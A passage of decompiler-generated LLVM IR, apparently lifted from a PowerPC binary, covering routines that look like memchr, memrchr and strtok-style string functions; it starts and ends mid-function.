  br label %dec_label_pc_1000aa34

dec_label_pc_1000aa34:                            ; preds = %dec_label_pc_1000aa34.loopexit, %dec_label_pc_1000aa04
  %v0_1000aa38 = phi i32 [ 0, %dec_label_pc_1000aa04 ], [ %v0_1000aa38.pre, %dec_label_pc_1000aa34.loopexit ]
  %v0_1000aa34 = phi i32 [ %v1_1000aa08, %dec_label_pc_1000aa04 ], [ %v0_1000aa34.pre, %dec_label_pc_1000aa34.loopexit ]
  %v0_1000aa5c16 = phi i32 [ %v0_1000aa287, %dec_label_pc_1000aa04 ], [ %v0_1000aa5c16.ph, %dec_label_pc_1000aa34.loopexit ]
  %v1_1000aa34 = mul i32 %v0_1000aa34, 256
  %v1_1000aa38 = udiv i32 %v0_1000aa38, 4
  %v2_1000aa3c = or i32 %v1_1000aa34, %v0_1000aa34
  %v1_1000aa44 = mul i32 %v2_1000aa3c, 65536
  %v2_1000aa50 = or i32 %v1_1000aa44, %v2_1000aa3c
  store i32 %v1_1000aa38, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000aa38, 4
  br i1 %tmp, label %dec_label_pc_1000aae4, label %dec_label_pc_1000aa5c

dec_label_pc_1000aa5c:                            ; preds = %dec_label_pc_1000aa34, %dec_label_pc_1000aae0.backedge
  %v0_1000aae0 = phi i32 [ %v1_1000aae0, %dec_label_pc_1000aae0.backedge ], [ %v1_1000aa38, %dec_label_pc_1000aa34 ]
  %v0_1000aa64 = phi i32 [ %v1_1000aa64, %dec_label_pc_1000aae0.backedge ], [ %v0_1000aa38, %dec_label_pc_1000aa34 ]
  %v0_1000aa9c = phi i32 [ %v1_1000aa60, %dec_label_pc_1000aae0.backedge ], [ %v0_1000aa5c16, %dec_label_pc_1000aa34 ]
  %v1_1000aa5c = inttoptr i32 %v0_1000aa9c to i32*
  %v2_1000aa5c = load i32, i32* %v1_1000aa5c, align 4
  %v1_1000aa60 = add i32 %v0_1000aa9c, 4
  store i32 %v1_1000aa60, i32* @r3, align 4
  %v1_1000aa64 = add i32 %v0_1000aa64, -4
  store i32 %v1_1000aa64, i32* %r5.global-to-local, align 4
  %v1_1000aa68 = add i32 %v0_1000aa9c, 1
  %v2_1000aa6c = xor i32 %v2_1000aa5c, %v2_1000aa50
  %v1_1000aa74 = add i32 %v2_1000aa6c, 2130640639
  %v2_1000aa78 = xor i32 %v1_1000aa74, %v2_1000aa6c
  %v2_1000aa7c = and i32 %v2_1000aa78, -2130640640
  %v6_1000aa7c = icmp eq i32 %v2_1000aa7c, -2130640640
  br i1 %v6_1000aa7c, label %dec_label_pc_1000aae0.backedge, label %dec_label_pc_1000aa88

dec_label_pc_1000aae0.backedge:                   ; preds = %dec_label_pc_1000aa5c, %dec_label_pc_1000aacc
  %v1_1000aae0 = add i32 %v0_1000aae0, -1
  store i32 %v1_1000aae0, i32* %ctr.global-to-local, align 4
  %v2_1000aae0 = icmp eq i32 %v1_1000aae0, 0
  br i1 %v2_1000aae0, label %dec_label_pc_1000aae4, label %dec_label_pc_1000aa5c

dec_label_pc_1000aa88:                            ; preds = %dec_label_pc_1000aa5c
  %v2_1000aa88 = inttoptr i32 %v0_1000aa9c to i8*
  %v3_1000aa88 = load i8, i8* %v2_1000aa88, align 1
  %v4_1000aa88 = zext i8 %v3_1000aa88 to i32
  %v1_1000aa8c = add i32 %v0_1000aa9c, 3
  %v1_1000aa90 = add i32 %v0_1000aa9c, 2
  %v4_1000aa94 = icmp eq i32 %v4_1000aa88, %v0_1000aa34
  br i1 %v4_1000aa94, label %dec_label_pc_1000aa9c, label %dec_label_pc_1000aaa4

dec_label_pc_1000aa9c:                            ; preds = %dec_label_pc_1000aa88
  ret i32 %v0_1000aa9c

dec_label_pc_1000aaa4:                            ; preds = %dec_label_pc_1000aa88
  %v2_1000aaa4 = inttoptr i32 %v1_1000aa68 to i8*
  %v3_1000aaa4 = load i8, i8* %v2_1000aaa4, align 1
  %v4_1000aaa4 = zext i8 %v3_1000aaa4 to i32
  %v4_1000aaa8 = icmp eq i32 %v4_1000aaa4, %v0_1000aa34
  br i1 %v4_1000aaa8, label %dec_label_pc_1000aab0, label %dec_label_pc_1000aab8

dec_label_pc_1000aab0:                            ; preds = %dec_label_pc_1000aaa4
  ret i32 %v1_1000aa68

dec_label_pc_1000aab8:                            ; preds = %dec_label_pc_1000aaa4
  %v2_1000aab8 = inttoptr i32 %v1_1000aa90 to i8*
  %v3_1000aab8 = load i8, i8* %v2_1000aab8, align 1
  %v4_1000aab8 = zext i8 %v3_1000aab8 to i32
  %v4_1000aabc = icmp eq i32 %v4_1000aab8, %v0_1000aa34
  br i1 %v4_1000aabc, label %dec_label_pc_1000aac4, label %dec_label_pc_1000aacc

dec_label_pc_1000aac4:                            ; preds = %dec_label_pc_1000aab8
  ret i32 %v1_1000aa90

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aab8
  %v2_1000aacc = inttoptr i32 %v1_1000aa8c to i8*
  %v3_1000aacc = load i8, i8* %v2_1000aacc, align 1
  %v4_1000aacc = zext i8 %v3_1000aacc to i32
  %v4_1000aad0 = icmp eq i32 %v4_1000aacc, %v0_1000aa34
  br i1 %v4_1000aad0, label %dec_label_pc_1000aad8, label %dec_label_pc_1000aae0.backedge

dec_label_pc_1000aad8:                            ; preds = %dec_label_pc_1000aacc
  ret i32 %v1_1000aa8c

dec_label_pc_1000aae4:                            ; preds = %dec_label_pc_1000aae0.backedge, %dec_label_pc_1000aa34
  %v0_1000aaf026 = phi i32 [ %v0_1000aa5c16, %dec_label_pc_1000aa34 ], [ %v1_1000aa60, %dec_label_pc_1000aae0.backedge ]
  %v0_1000aae4 = phi i32 [ %v0_1000aa38, %dec_label_pc_1000aa34 ], [ %v1_1000aa64, %dec_label_pc_1000aae0.backedge ]
  %v1_1000aae4 = add i32 %v0_1000aae4, 1
  store i32 %v1_1000aae4, i32* %r5.global-to-local, align 4
  store i32 %v0_1000aae4, i32* %ctr.global-to-local, align 4
  %v2_1000ab003 = icmp eq i32 %v0_1000aae4, 0
  br i1 %v2_1000ab003, label %dec_label_pc_1000ab04, label %dec_label_pc_1000aaf0

dec_label_pc_1000aaf0:                            ; preds = %dec_label_pc_1000aae4, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge
  %v1_1000aaf4 = phi i32 [ %v1_1000aaf4.pre, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge ], [ %v0_1000aa34, %dec_label_pc_1000aae4 ]
  %v0_1000aaf0 = phi i32 [ %v1_1000aafc, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge ], [ %v0_1000aaf026, %dec_label_pc_1000aae4 ]
  %v1_1000aaf0 = inttoptr i32 %v0_1000aaf0 to i8*
  %v2_1000aaf0 = load i8, i8* %v1_1000aaf0, align 1
  %v3_1000aaf0 = zext i8 %v2_1000aaf0 to i32
  %v4_1000aaf4 = icmp eq i32 %v3_1000aaf0, %v1_1000aaf4
  %v0_1000aaf8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000aaf4, i32 %v0_1000aaf8)
  %v0_1000aafc = load i32, i32* @r3, align 4
  %v1_1000aafc = add i32 %v0_1000aafc, 1
  store i32 %v1_1000aafc, i32* @r3, align 4
  %v0_1000ab00 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab00 = add i32 %v0_1000ab00, -1
  store i32 %v1_1000ab00, i32* %ctr.global-to-local, align 4
  %v2_1000ab00 = icmp eq i32 %v1_1000ab00, 0
  br i1 %v2_1000ab00, label %dec_label_pc_1000ab04, label %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge

dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge: ; preds = %dec_label_pc_1000aaf0
  %v1_1000aaf4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000aaf0

dec_label_pc_1000ab04:                            ; preds = %dec_label_pc_1000aaf0, %dec_label_pc_1000aae4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ab00, { 1, 0 }
  uselistorder i32 %v1_1000aafc, { 1, 0 }
  uselistorder i32 %v0_1000aae4, { 1, 2, 0 }
  uselistorder i32 %v1_1000aae0, { 2, 1, 0 }
  uselistorder i32 %v1_1000aa64, { 0, 2, 1 }
  uselistorder i32 %v1_1000aa60, { 0, 2, 1 }
  uselistorder i32 %v0_1000aa9c, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000aa3c, { 1, 0 }
  uselistorder i32 %v1_1000aa38, { 1, 0 }
  uselistorder i32 %v0_1000aa5c16, { 1, 0 }
  uselistorder i32 %v0_1000aa34, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000aa38, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000aa2c, { 1, 0 }
  uselistorder i32 %v1_1000aa24, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000aa287, { 2, 0, 1 }
  uselistorder i32 %v1_1000aa08, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000aaf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aae0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa30, { 1, 0 }
}

define i32 @function_1000ab0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000ab0c:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268479272, i32* @lr, align 4
  %v0_1000ab24 = call i32 @function_10007108()
  %v0_1000ab2c = load i32, i32* @r28, align 4
  %v1_1000ab2c = load i32, i32* @r29, align 4
  %v2_1000ab2c = add i32 %v1_1000ab2c, %v0_1000ab2c
  ret i32 %v2_1000ab2c
}

define i32 @function_1000ab40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000ab40:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000ab44 = urem i32 %arg2, 256
  store i32 %v1_1000ab44, i32* %r4.global-to-local, align 4
  %v2_1000ab4c = add i32 %arg3, %arg1
  store i32 %v2_1000ab4c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000ab6813 = icmp eq i32 %arg3, 0
  br i1 %v2_1000ab6813, label %dec_label_pc_1000ab70, label %dec_label_pc_1000ab6c

dec_label_pc_1000ab54:                            ; preds = %dec_label_pc_1000ab6c
  %v1_1000ab54 = add i32 %v0_1000ab54, -1
  %v2_1000ab54 = inttoptr i32 %v1_1000ab54 to i8*
  %v3_1000ab54 = load i8, i8* %v2_1000ab54, align 1
  %v4_1000ab54 = zext i8 %v3_1000ab54 to i32
  store i32 %v1_1000ab54, i32* %r3.global-to-local, align 4
  %v0_1000ab58 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ab58 = add i32 %v0_1000ab58, -1
  store i32 %v1_1000ab58, i32* %r5.global-to-local, align 4
  %v1_1000ab5c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000ab5c = icmp eq i32 %v4_1000ab54, %v1_1000ab5c
  %v0_1000ab60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ab5c, i32 %v0_1000ab60)
  %v0_1000ab64 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ab68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab68 = add i32 %v0_1000ab68, -1
  store i32 %v1_1000ab68, i32* %ctr.global-to-local, align 4
  %v2_1000ab68 = icmp eq i32 %v1_1000ab68, 0
  br i1 %v2_1000ab68, label %dec_label_pc_1000ab70.loopexit, label %dec_label_pc_1000ab6c

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000ab40, %dec_label_pc_1000ab54
  %v0_1000ab54 = phi i32 [ %v0_1000ab64, %dec_label_pc_1000ab54 ], [ %v2_1000ab4c, %dec_label_pc_1000ab40 ]
  %v0_1000ab6c.in.in = phi i32 [ %v0_1000ab64, %dec_label_pc_1000ab54 ], [ %v2_1000ab4c, %dec_label_pc_1000ab40 ]
  %v0_1000ab6c.in = urem i32 %v0_1000ab6c.in.in, 4
  %v0_1000ab6c = icmp eq i32 %v0_1000ab6c.in, 0
  br i1 %v0_1000ab6c, label %dec_label_pc_1000ab70.loopexit, label %dec_label_pc_1000ab54

dec_label_pc_1000ab70.loopexit:                   ; preds = %dec_label_pc_1000ab6c, %dec_label_pc_1000ab54
  %v0_1000ab9816.ph = phi i32 [ %v0_1000ab64, %dec_label_pc_1000ab54 ], [ %v0_1000ab54, %dec_label_pc_1000ab6c ]
  %v0_1000ab70.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000ab74.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ab70

dec_label_pc_1000ab70:                            ; preds = %dec_label_pc_1000ab70.loopexit, %dec_label_pc_1000ab40
  %v0_1000ab74 = phi i32 [ 0, %dec_label_pc_1000ab40 ], [ %v0_1000ab74.pre, %dec_label_pc_1000ab70.loopexit ]
  %v0_1000ab70 = phi i32 [ %v1_1000ab44, %dec_label_pc_1000ab40 ], [ %v0_1000ab70.pre, %dec_label_pc_1000ab70.loopexit ]
  %v0_1000ab9816 = phi i32 [ %v2_1000ab4c, %dec_label_pc_1000ab40 ], [ %v0_1000ab9816.ph, %dec_label_pc_1000ab70.loopexit ]
  %v1_1000ab70 = mul i32 %v0_1000ab70, 256
  %v1_1000ab74 = udiv i32 %v0_1000ab74, 4
  %v2_1000ab78 = or i32 %v1_1000ab70, %v0_1000ab70
  %v1_1000ab80 = mul i32 %v2_1000ab78, 65536
  %v2_1000ab8c = or i32 %v1_1000ab80, %v2_1000ab78
  store i32 %v2_1000ab8c, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_1000ab74, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000ab74, 4
  br i1 %tmp, label %dec_label_pc_1000ac10, label %dec_label_pc_1000ab98

dec_label_pc_1000ab98:                            ; preds = %dec_label_pc_1000ab70, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge
  %v0_1000ac0c21 = phi i32 [ %v1_1000ac0c, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge ], [ %v1_1000ab74, %dec_label_pc_1000ab70 ]
  %v0_1000abb8 = phi i32 [ %v0_1000abb8.pre, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge ], [ -2130640640, %dec_label_pc_1000ab70 ]
  %v0_1000aba0 = phi i32 [ %v0_1000aba0.pre, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge ], [ %v2_1000ab8c, %dec_label_pc_1000ab70 ]
  %v0_1000ab9c = phi i32 [ %v0_1000ab9c.pre, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge ], [ %v0_1000ab74, %dec_label_pc_1000ab70 ]
  %v0_1000ab98 = phi i32 [ %v0_1000ab98.pre, %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge ], [ %v0_1000ab9816, %dec_label_pc_1000ab70 ]
  %v1_1000ab98 = add i32 %v0_1000ab98, -4
  %v2_1000ab98 = inttoptr i32 %v1_1000ab98 to i32*
  %v3_1000ab98 = load i32, i32* %v2_1000ab98, align 4
  store i32 %v1_1000ab98, i32* %r3.global-to-local, align 4
  %v1_1000ab9c = add i32 %v0_1000ab9c, -4
  store i32 %v1_1000ab9c, i32* %r5.global-to-local, align 4
  %v2_1000aba0 = xor i32 %v3_1000ab98, %v0_1000aba0
  %v1_1000aba4 = add i32 %v0_1000ab98, -3
  %v1_1000abac = add i32 %v2_1000aba0, 2130640639
  %v1_1000abb4 = add i32 %v0_1000ab98, -2
  %v2_1000abb0 = sub i32 -1, %v2_1000aba0
  %v2_1000abb8 = xor i32 %v1_1000abac, %v2_1000abb0
  %v3_1000abb8 = and i32 %v2_1000abb8, %v0_1000abb8
  %v6_1000abb8 = icmp eq i32 %v3_1000abb8, 0
  %v1_1000abbc = add i32 %v0_1000ab98, -1
  br i1 %v6_1000abb8, label %dec_label_pc_1000ac0c.backedge, label %dec_label_pc_1000abc4

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000ab98
  %v2_1000abc4 = inttoptr i32 %v1_1000abbc to i8*
  %v3_1000abc4 = load i8, i8* %v2_1000abc4, align 1
  %v4_1000abc4 = zext i8 %v3_1000abc4 to i32
  %v1_1000abc8 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000abc8 = icmp eq i32 %v4_1000abc4, %v1_1000abc8
  br i1 %v4_1000abc8, label %dec_label_pc_1000abd0, label %dec_label_pc_1000abd8

dec_label_pc_1000abd0:                            ; preds = %dec_label_pc_1000abc4
  store i32 %v1_1000abbc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000abbc

dec_label_pc_1000abd8:                            ; preds = %dec_label_pc_1000abc4
  %v2_1000abd8 = inttoptr i32 %v1_1000abb4 to i8*
  %v3_1000abd8 = load i8, i8* %v2_1000abd8, align 1
  %v4_1000abd8 = zext i8 %v3_1000abd8 to i32
  %v4_1000abdc = icmp eq i32 %v4_1000abd8, %v1_1000abc8
  br i1 %v4_1000abdc, label %dec_label_pc_1000abe4, label %dec_label_pc_1000abec

dec_label_pc_1000abe4:                            ; preds = %dec_label_pc_1000abd8
  store i32 %v1_1000abb4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000abb4

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000abd8
  %v2_1000abec = inttoptr i32 %v1_1000aba4 to i8*
  %v3_1000abec = load i8, i8* %v2_1000abec, align 1
  %v4_1000abec = zext i8 %v3_1000abec to i32
  %v4_1000abf0 = icmp eq i32 %v4_1000abec, %v1_1000abc8
  br i1 %v4_1000abf0, label %dec_label_pc_1000abf8, label %dec_label_pc_1000ac00

dec_label_pc_1000abf8:                            ; preds = %dec_label_pc_1000abec
  store i32 %v1_1000aba4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000aba4

dec_label_pc_1000ac00:                            ; preds = %dec_label_pc_1000abec
  %v1_1000ac00 = inttoptr i32 %v1_1000ab98 to i8*
  %v2_1000ac00 = load i8, i8* %v1_1000ac00, align 1
  %v3_1000ac00 = zext i8 %v2_1000ac00 to i32
  %v4_1000ac04 = icmp eq i32 %v3_1000ac00, %v1_1000abc8
  %v0_1000ac08 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ac04, i32 %v0_1000ac08)
  %v0_1000ac0c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ac0c.backedge

dec_label_pc_1000ac0c.backedge:                   ; preds = %dec_label_pc_1000ac00, %dec_label_pc_1000ab98
  %v0_1000ac0c = phi i32 [ %v0_1000ac0c.pre, %dec_label_pc_1000ac00 ], [ %v0_1000ac0c21, %dec_label_pc_1000ab98 ]
  %v1_1000ac0c = add i32 %v0_1000ac0c, -1
  store i32 %v1_1000ac0c, i32* %ctr.global-to-local, align 4
  %v2_1000ac0c = icmp eq i32 %v1_1000ac0c, 0
  br i1 %v2_1000ac0c, label %dec_label_pc_1000ac0c.dec_label_pc_1000ac10_crit_edge, label %dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge

dec_label_pc_1000ac0c.backedge.dec_label_pc_1000ab98_crit_edge: ; preds = %dec_label_pc_1000ac0c.backedge
  %v0_1000ab98.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ab9c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000aba0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000abb8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ab98

dec_label_pc_1000ac0c.dec_label_pc_1000ac10_crit_edge: ; preds = %dec_label_pc_1000ac0c.backedge
  %v0_1000ac10.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ac10

dec_label_pc_1000ac10:                            ; preds = %dec_label_pc_1000ac0c.dec_label_pc_1000ac10_crit_edge, %dec_label_pc_1000ab70
  %v0_1000ac10 = phi i32 [ %v0_1000ac10.pre, %dec_label_pc_1000ac0c.dec_label_pc_1000ac10_crit_edge ], [ %v0_1000ab74, %dec_label_pc_1000ab70 ]
  %v1_1000ac10 = add i32 %v0_1000ac10, 1
  store i32 %v1_1000ac10, i32* %r5.global-to-local, align 4
  store i32 %v0_1000ac10, i32* %ctr.global-to-local, align 4
  %v2_1000ac283 = icmp eq i32 %v0_1000ac10, 0
  br i1 %v2_1000ac283, label %dec_label_pc_1000ac2c, label %dec_label_pc_1000ac1c

dec_label_pc_1000ac1c:                            ; preds = %dec_label_pc_1000ac10, %dec_label_pc_1000ac1c
  %v0_1000ac1c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ac1c = add i32 %v0_1000ac1c, -1
  %v2_1000ac1c = inttoptr i32 %v1_1000ac1c to i8*
  %v3_1000ac1c = load i8, i8* %v2_1000ac1c, align 1
  %v4_1000ac1c = zext i8 %v3_1000ac1c to i32
  store i32 %v1_1000ac1c, i32* %r3.global-to-local, align 4
  %v1_1000ac20 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000ac20 = icmp eq i32 %v4_1000ac1c, %v1_1000ac20
  %v0_1000ac24 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ac20, i32 %v0_1000ac24)
  %v0_1000ac28 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ac28 = add i32 %v0_1000ac28, -1
  store i32 %v1_1000ac28, i32* %ctr.global-to-local, align 4
  %v2_1000ac28 = icmp eq i32 %v1_1000ac28, 0
  br i1 %v2_1000ac28, label %dec_label_pc_1000ac2c, label %dec_label_pc_1000ac1c

dec_label_pc_1000ac2c:                            ; preds = %dec_label_pc_1000ac1c, %dec_label_pc_1000ac10
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ac28, { 1, 0 }
  uselistorder i32 %v0_1000ac10, { 1, 2, 0 }
  uselistorder i32 %v1_1000ac0c, { 2, 1, 0 }
  uselistorder i32 %v1_1000abbc, { 1, 0, 2 }
  uselistorder i32 %v1_1000abb4, { 1, 0, 2 }
  uselistorder i32 %v1_1000aba4, { 1, 0, 2 }
  uselistorder i32 %v2_1000ab78, { 1, 0 }
  uselistorder i32 %v1_1000ab74, { 1, 0 }
  uselistorder i32 %v0_1000ab70, { 1, 0 }
  uselistorder i32 %v0_1000ab74, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000ab68, { 1, 0 }
  uselistorder i32 %v0_1000ab64, { 1, 0, 2 }
  uselistorder i32 %v2_1000ab4c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000ab44, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 6, 5, 2, 8, 7, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ac1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab98, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab6c, { 1, 0 }
}

define i32 @function_1000ac34(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ac34:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ac38 = load i32, i32* @lr, align 4
  store i32 %v0_1000ac38, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000ac40 = icmp eq i32 %arg1, 0
  %v0_1000ac48 = load i32, i32* @r5, align 4
  store i32 %v0_1000ac48, i32* %r30.global-to-local, align 4
  %v0_1000ac4c = load i32, i32* @r4, align 4
  store i32 %v0_1000ac4c, i32* %r29.global-to-local, align 4
  br i1 %v3_1000ac40, label %dec_label_pc_1000ac54, label %dec_label_pc_1000ac58

dec_label_pc_1000ac54:                            ; preds = %dec_label_pc_1000ac34
  %v1_1000ac54 = inttoptr i32 %v0_1000ac48 to i32*
  %v2_1000ac54 = load i32, i32* %v1_1000ac54, align 4
  store i32 %v2_1000ac54, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ac58

dec_label_pc_1000ac58:                            ; preds = %dec_label_pc_1000ac34, %dec_label_pc_1000ac54
  %v0_1000ac58 = phi i32 [ %arg1, %dec_label_pc_1000ac34 ], [ %v2_1000ac54, %dec_label_pc_1000ac54 ]
  store i32 %v0_1000ac58, i32* @r3, align 4
  %v1_1000ac5c = inttoptr i32 %v0_1000ac58 to i8*
  %v2_1000ac5c = call i32 @function_1000c0d8(i8* %v1_1000ac5c)
  %v0_1000ac60 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000ac64 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac64 = add i32 %v0_1000ac64, %v2_1000ac5c
  %v3_1000ac64 = inttoptr i32 %v2_1000ac64 to i8*
  %v4_1000ac64 = load i8, i8* %v3_1000ac64, align 1
  store i32 %v2_1000ac64, i32* @r31, align 4
  store i32 %v2_1000ac64, i32* @r3, align 4
  %v3_1000ac70 = icmp eq i8 %v4_1000ac64, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ac70, label %dec_label_pc_1000ac7c, label %dec_label_pc_1000ac84

dec_label_pc_1000ac7c:                            ; preds = %dec_label_pc_1000ac58
  %v1_1000ac7c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ac7c = inttoptr i32 %v1_1000ac7c to i32*
  store i32 %v2_1000ac64, i32* %v2_1000ac7c, align 4
  br label %dec_label_pc_1000acbc

dec_label_pc_1000ac84:                            ; preds = %dec_label_pc_1000ac58
  store i32 268479624, i32* @lr, align 4
  %v3_1000ac84 = call i32 @function_1000acd4(i8* %v3_1000ac64, i32 %v0_1000ac60)
  %v4_1000ac8c = icmp eq i32 %v3_1000ac84, 0
  %v0_1000ac90 = load i32, i32* @r31, align 4
  store i32 %v0_1000ac90, i32* @r3, align 4
  %v2_1000ac94 = add i32 %v3_1000ac84, 1
  store i32 %v2_1000ac94, i32* %r11.global-to-local, align 4
  br i1 %v4_1000ac8c, label %dec_label_pc_1000ac9c, label %dec_label_pc_1000acac

dec_label_pc_1000ac9c:                            ; preds = %dec_label_pc_1000ac84
  store i32 268479648, i32* @lr, align 4
  %v4_1000ac9c = call i32 @function_1000bf50(i32 %v0_1000ac90, i32 0, i32 0)
  %v0_1000aca0 = load i32, i32* @r31, align 4
  store i32 %v0_1000aca0, i32* %r0.global-to-local, align 4
  %v1_1000aca4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000aca4 = inttoptr i32 %v1_1000aca4 to i32*
  store i32 %v4_1000ac9c, i32* %v2_1000aca4, align 4
  br label %dec_label_pc_1000acbc

dec_label_pc_1000acac:                            ; preds = %dec_label_pc_1000ac84
  %v1_1000ac8c = inttoptr i32 %v3_1000ac84 to i8*
  store i8 0, i8* %v1_1000ac8c, align 1
  %v0_1000acb4 = load i32, i32* @r31, align 4
  store i32 %v0_1000acb4, i32* %r0.global-to-local, align 4
  %v0_1000acb8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000acb8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000acb8 = inttoptr i32 %v1_1000acb8 to i32*
  store i32 %v0_1000acb8, i32* %v2_1000acb8, align 4
  br label %dec_label_pc_1000acbc

dec_label_pc_1000acbc:                            ; preds = %dec_label_pc_1000ac9c, %dec_label_pc_1000ac7c, %dec_label_pc_1000acac
  %v0_1000acbc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ac38, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000acbc

; uselistorder directives
  uselistorder i32 %v3_1000ac84, { 2, 0, 1 }
  uselistorder i32 %v2_1000ac64, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000ac58, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000acbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ac58, { 1, 0 }
}

define i32 @function_1000acd4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000acd4:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000acf41 = load i32, i32* @r3, align 4
  %v1_1000acf42 = inttoptr i32 %v0_1000acf41 to i8*
